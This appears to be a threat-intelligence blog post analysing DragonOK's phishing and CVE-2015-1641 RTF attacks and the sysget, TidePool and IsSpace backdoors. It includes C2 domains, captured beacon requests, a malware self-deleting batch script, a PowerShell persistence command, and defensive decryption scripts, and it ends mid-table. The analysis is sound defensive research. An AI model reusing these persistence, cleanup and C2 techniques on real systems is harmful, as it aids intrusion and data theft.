We first discussed them in April\n2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42\nhas observed a number of attacks that we attribute to this group. Multiple new variants of the\npreviously discussed sysget malware family have been observed in use by DragonOK. Sysget\n[malware was delivered both directly via phishing emails, as well as in Rich Text Format (RTF)](https://en.wikipedia.org/wiki/Rich_Text_Format)\n[documents exploiting the CVE-2015-1641 vulnerability (patched in MS15-033) that in turn leveraged a](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641)\n[very unique shellcode. Additionally, we have observed instances of the IsSpace and](https://blog.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/) [TidePool malware](https://blog.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/)\nfamilies being delivered via the same techniques. While Japan is still the most heavily targeted\ngeographic region by this particular actor, we also observed instances where individuals or\norganizations in Taiwan, Tibet, and Russia also may have been targeted.\n\n## Infiltration\n\nWe observed two unique techniques of infiltration for this particular campaign:\n\n1. Phishing emails being sent with malicious executables directly attached\n[2. Malicious RTF files which exploit CVE-2015-1641.](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641)\n\n\n-----\n\nThe phishing emails had the following characteristics:\n\n**Email Subjects**\n\nPickup at the [Juanda Airport (1-Sep)](https://en.wikipedia.org/wiki/Juanda_International_Airport)\nポイントプレゼントのお知らせ [Roughly Translated: Point gift announcement]\n20周年記念パーティー [Roughly Translated: 20th Anniversary Party]\n参加者の10周年記念同窓会一覧 [Roughly Translated: List of participants' 10th anniversary alumni\nassociation]\n子供の調査連れ [Roughly Translated: Children's investigation]\nG20 report\n記念日の再会 [Roughly Translated: Anniversary reunion]\n最新の人事異動通知 [Roughly Translated: Recent personnel change notice]\n\n**Attachment Filenames**\n\nG20 report.exe\nexe\nList of Participants.exe\nRegistration form.exe\n\nThese emails targeted the following industries in Japan:\n\nManufacturing\nHigher Education\nEnergy\nTechnology\nSemiconductor\n\nThe malicious RTF files in question leverage a very specific shellcode to drop and execute the\nmalicious payload, as well as a decoy document. Decoy documents are legitimate benign documents\nthat are opened after the malicious payload is delivered, thus ensuring that the victim does not become\nsuspicious because their expected document opened as expected.\n\nTwo samples were found to include the decoy document show in Figure 1.\n\nThe title of the document roughly translates to “Ministry of Communications & Departments Authorities\nEmpty Sites and Hosted Public Works Source Clearance Photos”. The use of traditional Chinese\nindicators the target likely residing in either Taiwan, Hong Kong, or Macau. However, based on the\nTaiwanese subject matter in this document, we can safely come to the conclusion that the intended\nvictim was of Taiwanese origin. These samples delivered an updated version of the IsSpace malware\n[family, which was discussed previously in a watering hole attack targeting an aerospace firm. IsSpace](https://blog.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/)\nis an evolved variant of the NFlog backdoor, which has been used by DragonOK in the past.\n\n\n-----\n\n_Figure 1 Taiwanese decoy document_\n\nTwo other samples were identified that used a Tibet-themed decoy document. The document in\n[question (Figure 2) appears to be an internal newsletter from the Central Tibetan Ministry, as](http://tibet.net/information/)\nsuggested by the logo used as well as the content of the document itself. This document indicates that\n\n\n-----\n\nthe malware may have been targeted towards an individual that is interested in Tibetan affairs. These\nparticular samples were unique in that they delivered the TidePool malware family that we reported on\nin May of 2016. We have not previously observed DragonOK using TidePool in attacks.\n\n_Figure 2 Tibetan decoy document containing internal newsletter_\n\nWe also identified an additional sample using decoy targeting Taiwanese victims (Figure 3), which\ndeployed a newer sysget sample.\n\n\n-----\n\n-----\n\n_Figure 3 Taiwanese-targeted decoy document_\n\nOther new samples associated with this group used a Russian language decoy document (Figure 4.)\nThe decoy document in question discusses the GOST block cipher, which was created by the Russian\ngovernment in the 1970’s. The combination of Russian language and Russian-specific subject matter\nindicates that the intended victim speaks Russian and may be interested in encryption. Like the\npreviously discussed Tibetan decoy documents, these samples also delivered the TidePool malware\nfamily.\n\n\n-----\n\n_Figure 4 Russian decoy document discussing the GOST block cipher_\n\n\n-----\n\nFinally, multiple samples used a traditional Chinese language decoy document that discussed a\nsubsidy welfare adjustment program. The use of traditional Chinese indicators the target likely residing\nin either Taiwan, Hong Kong, or Macau. Similar to other attacks witnessed, a variant of the sysget\nmalware family is installed by these files.\n\n_Figure 5 Decoy document discussing subsidy welfare adjustment program_\n\n## Malware Deployed\n\n\n-----\n\nIn looking at the various malware samples used in attempted attacks, the following four families were\nidentified:\n\nSysget version 2\nSysget version 3\nTidePool\nIsSpace\n\nWe broke the sysget classification into multiple variants when we found that a number of changes have\nbeen made since our April 2015 report. Major distinctions between the versions of sysget include the\nfollowing:\n\n**Sysget version 2**\n\nRemoved support for persistence on Windows XP\nReworked the URIs used for network communication\nAdded additional layers of encryption for network communication and stored configuration files\nSwitched from RC4 to AES-128\n\n**Sysget version 3**\n\nNumerous anti-debug and anti-vm procedures added\nEncrypted URIs in network communication with an initial static key\n\nIn addition, we observed a sysget version 4 that was discovered in another sample during our\nresearch. This version is not attributed to a specific attack against an organization.\n\nIndicators of compromise related to sysget version 4 and other samples not directly attributed to\nspecific attacks may be found in the Appendix of this blog post. Additionally, more information about\nthe various sysget variants may also be found in the Appendix.\n\nThe TidePool samples encountered are consistent with the samples previously discussed. I encourage\n[readers to view our previous blog post to learn more about the intricacies of this particular malware](https://blog.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/)\nfamily.\n\n[The IsSpace malware sample, however, looks to have been updated since last we wrote on it. While](https://blog.paloaltonetworks.com/2015/07/watering-hole-attack-on-aerospace-firm-exploits-cve-2015-5122-to-install-isspace-backdoor/)\nthe available commands from the command and control (C2) server remains the same, the URI\nstructure of the network communication has been modified. Additionally, the installation routine for this\nmalware family has been updated to be far less complex than previous discussed versions, favoring\nPowerShell to set persistence and forgoing the previously used side-loading technique. A more\ndetailed analysis of the new instances of IsSpace may be found at the end of this blog post in the\nAppendix.\n\n## Infrastructure\n\nA number of unique domains were employed by the various Trojans used in these attacks. For the\nnumerous instances of sysget we observed, the following domains were observed for their C2:\n\nkr44.78host[.]com\ngtoimage[.]com\n\n\n-----\n\ngogolekr[.]com\n\nAll of the above domains have Chinese WHOIS registrant details. Additionally, the gotoimage[.]com\nand trend.gogolekr[.]com are both registered to the same registrant and resolve to the same netblock\nof 104.202.173.0/24.\n\nThe instances of TidePool identified communicated with the following C2 servers:\n\neurope.wikaba[.]com\nrussiaboy.ssl443[.]org\ncool.skywave[.]top\n\nThese domains did not have many definitive relations with the sysget C2 servers except for\ncool.skywave[.]top, which shared a unique registrant email with the sysget C2 server of\ntrend.gogolekr[.]com. Additionally, the geographic region of the resolved IPs was consistent with the\nprevious set, as they all resolved to various regions in southeast Asia. Specifically, the domains\nresolved to China, Korea, and Taiwan in the past six months.\n\nThe IsSpace samples resolved to the following domains:\n\nwww.dppline[.]org\nwww.matrens[.]top\n\nThese domains had no apparent connections to the previously discussed C2 servers, other than the\nfact that they resolved to Korea and Hong Kong respectively. Additionally, the registrar of ‘Jiangsu\nBangning Science and technology Co. Ltd.’ was used for a large number of domains. A full graph of\nthe relations between the various attacks is shown in Figure 6.\n\n_Figure 6 Relationships between attacks_\n\n\n-----\n\n## Conclusion\n\nThe DragonOK group are quite active and continue updating their tools and tactics. Their toolset is\nbeing actively developed to make detection and analysis more difficult. Additionally, they appear to be\nusing additional malware toolsets such as TidePool. While Japan is still the most-targeted region by\nthis group, they look to be seeking out victims in other regions as well, such as Taiwan, Tibet, and\nRussia.\n\nPalo Alto Network customers are protected against this threat in the following ways:\n\n[Malware families are tagged in AutoFocus via a variety of tags (TidePool,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Tidepool) [NFlog,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NFlog) [Sysget)](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Sysget)\nThe following IPS signatures detect malicious network traffic:\n\nIPS signature 14365 (IsSpace.Gen Command And Control Traffic)\nIPS signature 14588 (Suspicious.Gen Command And Control Traffic)\nIPS signature 13574 (NfLog.Gen Command And Control Traffic)\nIPS signature 13359 (Nflog.Gen Command And Control Traffic)\nAll samples are appropriately marked malicious in WildFire\n\n## Appendix\n\n**CVE-2015-1641 Exploit and Shellcode**\n\nThis particular group uses a very specific shellcode payload when exploiting CVE-2015-1641. This\nCVE is memory corruption vulnerability which allows for arbitrary code execution in various versions of\nMicrosoft Office, including 2007, 2010, and 2013.\n\nThe shellcode begins by dynamically loading a small number of API functions from kernel32. A number\nof hashes are included that represent function names, which have a rotate right 7 (ROR7) operation\napplied against them before being XORed against a key of “\\x10\\xAD\\xBE\\xEF”. The ROR7 operation\nis a very common technique in shellcode to obfuscate what functions are being called. The author\nadded the XOR operation to add another layer of obfuscation.\n\n_Figure 7 API function hashes contained in shellcode_\n\n\n-----\n\nAfter the shellcode loads the necessary API functions, it proceeds to seek out a number of markers\nthat will mark the beginning and ending of both an embedded malicious payload, as well as a decoy\ndocument.\n\nThe malicious executable is marked with a starting point of 0xBABABABABABA and an end marker of\n0xBBBBBBBB. The decoy document is found immediately after the end of the malicious payload, and\nhas an end marker of 0xBCBCBCBC. Both executables are encrypted with a 4-byte XOR key. Should\nthe original data contain 0x00000000, it will not have the XOR applied against it.\n\nThe malicious payload is XORed against a key of 0xCAFEBEEF and the decoy document is XORed\nagainst 0xBAADF00D. The following script may be applied against the RTF document to extract both\nthe malicious payload and the decoy:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nimport sys, binascii\nfrom itertools import cycle, izip\nimport re\n\ndef xor(message, key):\nreturn ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\n\ndef decrypt(data, key):\noutput = \"\"\niteration = 4\nposition = 0\nwhile True:\nwindow = data[position:position+iteration]\nif window == \"\\x00\\x00\\x00\\x00\":\noutput += window\nelse:\noutput += xor(window, key)\nposition += iteration\nif position == len(data) or position > len(data):\nbreak\nreturn output\n\ndef extract(data):\nexe_data, doc_data = None, None\nexe_starting_point = data.index(\"\\xBA\\xBA\\xBA\\xBA\\xBA\\xBA\") + 6\nexe_ending_point = None\nending_points = [m.start() for m in re.finditer(\"\\xBB\\xBB\\xBB\\xBB\", data)]\nfor e in ending_points:\nif e > exe_starting_point:\nexe_ending_point = e\nif exe_starting_point and exe_ending_point:\nmz_data = data[exe_starting_point:exe_ending_point]\nexe_data = decrypt(mz_data, \"\\xBE\\xBA\\xFE\\xCA\")\nelse:\nraise Exception(\"Unable to find correct offsets for executable.\")\n\ndoc_starting_point = exe_ending_point + 4\ndoc_ending_point = None\nending_points = [m.start() for m in re.finditer(\"\\xBC\\xBC\\xBC\\xBC\", data)]\n\nfor e in ending points:\n\n\n-----\n\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\nif e > doc_starting_point:\ndoc_ending_point = e\nif doc_starting_point and doc_ending_point:\ndoc = data[doc_starting_point:doc_ending_point]\ndoc_data = decrypt(doc, \"\\x0D\\xF0\\xAD\\xBA\")\nelse:\nraise Exception(\"Unable to find correct offsets for document.\")\nreturn [exe_data, doc_data]\n\ndef main():\ninput_file = sys.argv[1]\ninput_fh = open(input_file, 'rb')\ninput_data = input_fh.read()\ninput_fh.close()\nexe, doc = extract(input_data)\n\nfilename = \"{}.exe\".format(input_file)\noutput_file = open(filename, 'wb')\noutput_file.write(exe)\noutput_file.close()\nprint \"[+] Wrote {}\".format(filename)\n\nfilename = \"{}.doc\".format(input_file)\noutput_file = open(filename, 'wb')\noutput_file.write(doc)\noutput_file.close()\nprint \"[+] Wrote {}\".format(filename)\n\nif len(sys.argv) == 2 and __name__ == \"__main__\":\nmain()\n\n\nWhen both files are decrypted, they are written to the following location in the %TEMP% directory:\n\n../..exe\n../..doc\n\nNote the initial ‘..’, which represents the parent directory of %TEMP%. This coupled with the unusual\nnames of ..exe and ..doc make this particular shellcode very unique, which is one way we have\nattributed these samples to the same group. After the samples have been written, they are executed\nvia calls to WinExec.\n\n## Sysget v2 Analysis\n\nOne of the fundamental changes witnessed in the second iteration of sysget is removing support for\nWindows XP and lower. Other changes include modifications to the URIs used for network\ncommunication.\n\nLike the original version of sysget, sysget v2 still uses a named event of ‘mcsong[]’ to ensure a single\ninstance is running at a time. It proceeds to make attempts at copying itself to the\n%STARTUP%/notilv.exe path. However, it uses COM objects to perform this action that is not available\nin Windows XP, which prevents the malware from installing itself to this location. While the remainder\nof the malware operates as expected, it will not survive a restart of the system.\n\n\n-----\n\nSysget proceeds to make an attempt at reading the following configuration file. This filename and path\nhas changed since the original version, and is consistent in the subsequent versions.\n\n%APPDATA%/vklCen5.tmp\n\nThis configuration file holds both a unique victim identifier, as well as a key that is used to encrypt\nHTTP traffic. It is encrypted using the AES-128 encryption algorithm, using a static key of ‘734thfg9ih’.\nUsing AES-128 is a change from the previous version, where RC4 was used for all encryption\noperations. The following Python code may be used to decrypt this file:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nimport sys\nimport base64\nfrom wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptDecrypt\n\ndef decrypt(data, original_key):\nCALG_AES_128 = 0x660E\nCALG_MD5 = 0x8003\nmd5_hasher = CryptCreateHash(CALG_MD5)\nCryptHashData(md5_hasher, original_key)\nkey = CryptDeriveKey(md5_hasher, CALG_AES_128)\ndecrypted_data = CryptDecrypt(key, data)\nreturn decrypted_data\n\narg = open(sys.argv[1], 'rb').read()\nprint repr(decrypt(arg, '734thfg9ih'))\n\n\nWhen executed against an example configuration file, we see the following output, which includes the\ntwo pieces of data noted previously:\n\n\n1\n2\n3\n4\n\n\nC:\\>python decrypt_config.py vklCen5.tmp\n'gh1443717133\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x001059086204\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n\nThe encryption of this configuration file is a new feature that was not present in the original version of\nsysget.\n\nIf this file is not present on the system, the malware will attempt to retrieve the necessary information\nvia a HTTP request. The following request is made to the remote command and control server. Note\nthat the full URI is statically set by the malware sample.\n\n\n1\n2\n3\n4\n5\n6\n\n\nGET /index.php?type=read&id=1420efbd80ce02328663631c8d8f813c&pageinfo=jp&lang=\nutf-8 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/40.0.2214.115 Safari/537.36\nHost: hello.newtaiwan[.]top\n\n\nThe server responds with the following data, encrypted using the same technique previously described\nwith a static key of ‘aliado75496’. Once decrypted, we see the following example data being sent back\nto sysget:\n\n\n-----\n\ngh1443717133\\n1059086204\\n\n\nThe first string is used as a key for all subsequent network communication. The second string is\ntreated as a unique victim identifier. This data is encrypted using the key of ‘734thfg9ih’ and written to\nthe %APPDATA%/vklCen5.tmp file.\n\nAfter this information has been obtained, the malware proceeds to enter its command and control loop.\nAn HTTP request such as the following is made to the remote server. Note that the ‘mid’ GET variable\nholds the MD5 hash of the previously obtained victim identifier. The remaining data in the URI is\nhardcoded.\n\n\n1\n2\n3\n4\n5\n\n\nGET /index.php?type=get&pageinfo=bridge03443&lang=jp&mid=5717cb8fed2750a2ee9e8\n30a30716ed4 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/40.0.2214.115 Safari/537.36\nHost: hello.newtaiwan[.]top\n\n\nThe response is encrypted using the unique key that was obtained previously. Should the response\ncontain ‘Fatal error’ unencrypted, no further actions are taken by the malware sample. Once decrypted,\nthe response may have one of the following two choices, and their accompanying purpose.\nAlternatively, if a raw command is provided, the malware will execute it and return the results.\n\n**Command** **Description**\n\n\ngoto wrong \"\n\n[file_path]\";\\n\n\ngoto right \"[filename]\" \"\n\n[identifier]\"\n\n\nRead a specific file and return its contents.\n\nWrite a given file. The identifier is used to retrieve the file’s contents in a\nsubsequent HTTP request.\n\n\nWhen the ‘goto wrong’ request is made, a HTTP POST request is made to the following URI. In the\nfollowing URI, the ‘list’ parameter contains the MD5 hash of the victim’s identifier.\n\n/index.php?type=register&pageinfo=myid32987&list=5717cb8fed2750a2ee9e830a3\n0716ed4\n\nThe contents of this POST request contains the victim’s identifier, as well as the file’s contents\nencrypted with the unique key. The first 50 bytes are reserved for the victim identifier, as shown below:\n\n\n1\n2\n3\n4\n\n\n0000016F 35 37 31 37 63 62 38 66 65 64 32 37 35 30 61 32 5717cb8f ed2750a2\n0000017F 65 65 39 65 38 33 30 61 33 30 37 31 36 65 64 34 ee9e830a 30716ed4\n0000018F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n0000019F 00 00 4b 59 bc 53 53 99 2b 6f a7 b5 5a 85 c7 66 ..KY.SS. +o..Z..f\n\n\nOnce decrypted, the data contains both the filename, as well as the contents of that file.\n\n\n1\n2\n\n\ntest.txt\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[TRUNCATED]\\x\n00\\x00\\x00file contents\n\n\n-----\n\nIf the goto right command is used, the malware will make a subsequent request to the following URI.\nThe ‘cache’ variable holds the unique identifier that was provided in the ‘goto right’ command.\n\n/index.php?type=goto&pageinfo=myid47386&cache=identifier\n\nOnce the file contents are obtained, they are written to the specified filename in the %STARTUP%\nfolder.\n\nWhen a raw command is received, the malware will upload the results to the following URI via a POST\nrequest:\n\n/index.php?type=register\n\nAn overview of the network communications exhibited by sysget version 2 can be seen in the figure\nbelow.\n\n\n-----\n\n-----\n\n_Figure 8 Sysget version 2 command and control flow_\n\n## Sysget v3 Analysis\n\nSome of the biggest changes witnessed in version 3 of sysget includes numerous anti-debug and antivm detections added, as well as the encryption of the URIs used for network communication.\n\nWhen the malware initially executes, it performs the following checks to ensure it is not being\ndebugged and not running in a sandbox or virtualized environment.\n\nShould these checks return false, the malware proceeds to enter its installation routine. The malware\noriginally copies itself to a temp file in the %TEMP% directory with a filename prefix of ‘00’. It proceeds\nto append 4194304 bytes of randomly chosen data to the end of this file. The increased filesize may\nhave been added by the author in an attempt to thwart sandboxes that impose filesize limits on what is\nsaved and/or processed. Finally, the malware copies the original file from the tmp path to the\n%STARTUP%/winlogon.exe path using the same technique witnessed in version 2. Sysget then writes\na batch script in the %TEMP% folder with the following contents, cleaning up the original files and\nspawning the newly written winlogon.exe executable:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@echo off\n:t\ntimeout 1\nfor /f %%i in ('tasklist /FI \"IMAGENAME eq [original_executable_name]\" ^| find /v /c \"\"' ) do set\nYO=%%i\nif %%YO%%==4 goto :t\ndel /F \"[original_executable_path]\"\ndel /F \"[tmp_file]\"\nstart /B cmd /c \"[startup_winlogon.exe]\"\ndel /F \"[self]\"\nexit\n\n\nAfter installation, sysget will attempt to read the same %APPDATA%/vklCen5.tmp file as witnessed in\nthe previous variant. A number of strings within the malware, including the ‘734thfg9ih’ key used to\nencrypt this file, have been obfuscated via a single-byte XOR of 0x5F.\n\nSimilar to previous versions, should this vklCen5.tmp file not be present on the victim machine, it will\nmake an external HTTP request to retrieve the necessary information. The following request is made\nby the malware. Readers will notice that the URI has changed from previous versions in a number of\nways. This version of sysget looks to always make requests to 1.php, which is hardcoded within the\nmalware itself. Additionally, all HTTP URIs in this version of sysget are encrypted. The initial GET\nrequest made to retrieve the victim identifier and unique key is encrypted with a key of ‘Cra%hello12sW’. The subsequent response containing this information is then decrypted using a key of\n‘aliado75496’, which is consistent with previous versions.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nGET\n/1.php?K+50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH+Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW\nSwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN\n4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV/K6Ft32dsMmmO52q4IdQ==\nHTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/40.0.2214.115 Safari/537.36\nHost: gtoimage.com\n\n\nWhen the URI above is base64-decoded and subsequently decrypted, we see the following:\n\nindex.php?type=read&id=692fdc3c7b2c310fc017e4af335b8dc8&pageinfo=jp&lang=utf-8\n\nThis URI is consistent with the previous sysget variant. It would seem the authors simply have added\nthis layer of encryption to hinder efforts to block the malware via network-based detections.\n\nAfter this initial request to retrieve the victim identifier and unique key, sysget enters its command and\ncontrol loop. This process is consistent with the previous version, but simply has the extra layer of\nencryption used for the URIs.\n\n## Sysget v4 Analysis\n\nThe fourth variant of sysget is nearly identical to the third variant. However, the main difference lies in\nthe URIs used for network communication. In addition to the expected encryption of the URIs, this\nvariant also mangles the base64 encoding that is performed afterwards. The following Python script\nmay be used to de-obfuscate the base64 URI found in this variant:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nimport base64\n\n'''\nURI Request:\n\nGET\n/5.php?62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0\nAMo+rT4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+\nBGFsc3wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed\n99 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/40.0.2214.115 Safari/537.36\nHost: www.sanseitime.com\n'''\n\nuri_string =\n\"62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0AMo+rT\n4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+BGFsc3\nwtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed99\"\n\nb64_string =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"\nprefix_int = int(uri_string[0:2])\nout = \"\"\n\nfor u in uri_string[2:]:\nind = b64_string.index(u) - prefix_int\nout += b64_string[ind]\n\ndecoded = base64.b64decode(out)\n\n\nAdditionally, the C2 URI changes in this variant, from 1.php to 5.php\n\n## IsSpace Analysis\n\nWhen initially run, IsSpace will create a unique event to ensure a single instance of the malware is\nrunning at a given time. This event name appears to be unique per the sample, as multiple samples\ncontained unique event names. The following event names have been observed in the samples that\nwere analyzed:\n\ne6al69MS5iP\nv485ILa3q5z\n\nIsSpace proceeds to iterate over the running processes on the system, seeking out the following two\nprocess substrings:\n\nuiSeAgnt\navp.exe\n\nThe uiSeAgnt string may be related to Trend Micro’s solutions, while avp.exe most likely is related to\nKaspersky’s anti-malware product.\n\n\n-----\n\nIn the event uiSeAgnt is identified, the malware will enter its installation routine if not already running\nas ‘bfsuc.exe’ and proceeds to exit afterwards. Should avp.exe be identified, the malware enters an\ninfinite sleep loop until a mouse click occurs. After this takes place, the malware proceeds as normal.\n\nThe malware then determines if it is running under Windows XP. In the event that it is, it will make a\nHTTP GET request to www.bing.com, presumably to ensure network connectivity.\n\n_Figure 9 IsSpace connecting to www.bing.com_\n\nIf the malware is not running on Windows XP, it will attempt to obtain and decrypt any basic\nauthentication credentials from Internet Explorer. This information is used in subsequent HTTP\nrequests in the event a 407 (Proxy Authentication Required) or 401 (Unauthorized) response code is\nreceived during network communication.\n\nIsSpace will then enter its installation routine, where it will first copy itself to the %LOCALAPPDATA%\nfolder with a name of ‘bfsuc.exe’. It then sets the proper registry key for persistence by executing the\nfollowing PowerShell command:\n\n\n1\n2\n3\n4\n\n\nC:\\Windows\\system32\\cmd.exe /C Powershell.exe New-ItemProperty -Path\nHKCU:SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run -Name Identity PropertyType String -Value c:\\users\\josh grunzweig\\appdata\\local\\bfsuc.exe\n-force\n\n\nThe malware then makes an initial HTTP POST request to the configured C2 server. It will make this\nrequest to the ‘/news/Senmsip.asp’ URI. The POST data is XORed against a key of\n“\\x35\\x8E\\x9D\\x7A”, which is consistent with previous versions of IsSpace and NFlog. Decrypted, the\nPOST data reads “01234567890”. The C2 server in turn will respond with the victim’s external IP\naddress.\n\n_Figure 10 Initial IsSpace beacon_\n\nIsSpace then spawns two threads that will make HTTP requests to the following URIs:\n\n/news/Sennw.asp?rsv_info=[MAC_ADDRESS]\n/news/Sentire.asp?rsv_info=[MAC_ADDRESS]\n\n\n-----\n\nThe Sennw.asp POST requests that are made contain collected victim information. They, like other\ninformation sent across the network, are encrypted using the previously mentioned 4-byte XOR key.\nWhen decrypted, we are provided with information such as the following:\n\n\n1\n2\n3\n\n\n60-F8-1D-CC-2F-CF#%#172.16.95.1#%#172.16.95.186#%#WINLJLV2NKIOKP#%#Win7#%#English(US)#%#2016-12-20\n16:27:12#%#Active#%#xp20160628#%#IsAdmins#%#False\n\n\nThe information, delimited via ‘#%#’, is as follows:\n\n**Value** **Description**\n\n60-F8-1D-CC-2F-CF MAC address\n\n172.16.95.1 External IP collected previously\n\n172.16.95.186 Internal IP address\n\nWIN-LJLV2NKIOKP Hostname\n\nWin7 Windows version\n\nEnglish(US) Language\n\n2016-12-20 16:27:12 Timestamp\n\nActive Malware status. May also be ‘Sleep’\n\nxp20160628 Potential campaign identifier\n\nIsAdmins / False User admin status\n\nThe malware is expected to return one of the following two responses to this HTTP request:\n\nActive\nSlient (Note the typo)\n\nIn the event the response of Slient is received, the malware will stop sending out HTTP requests to the\n‘Sentire.asp’ URI. Conversely, if the malware is set to the ‘Sleep’ status and the ‘Active’ response is\nreceived, it will begin the ‘Sentire.asp’ requests once more.\n\nThe requests to ‘Sentire.asp’ act as the main C2 loop, requesting commands from the remote server.\nThe commands are consistent with previously observed instances of IsSpace, however, the URIs have\nbeen modified.\n\n**Command** **Description**
